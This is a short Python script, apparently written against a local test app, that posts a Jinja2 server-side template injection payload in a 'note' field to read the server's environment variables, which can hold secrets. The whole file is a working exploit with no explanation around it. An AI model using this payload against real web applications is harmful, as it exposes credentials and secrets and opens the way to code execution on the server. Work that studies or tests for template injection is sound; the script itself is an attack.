import requests
import os 

BASE_URL="http://localhost:5000"

resp= requests.post(BASE_URL+"/test-note",data={'note':"{{self._TemplateReference__context.cycler.__init__.__globals__.os.environ}}"})

print(resp.text)